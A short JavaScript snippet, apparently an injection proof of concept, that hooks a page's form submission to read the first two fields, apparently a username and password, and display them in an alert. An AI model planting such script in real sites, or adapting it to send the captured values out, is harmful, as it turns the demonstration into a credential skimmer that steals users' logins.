function InterceptForm(){
  var username = document.forms[0].elements[0].value;
  var password = document.forms[0].elements[1].value;
  alert(username + ':'+ password);
}
document.forms[0].onsubmit =InterceptForm;
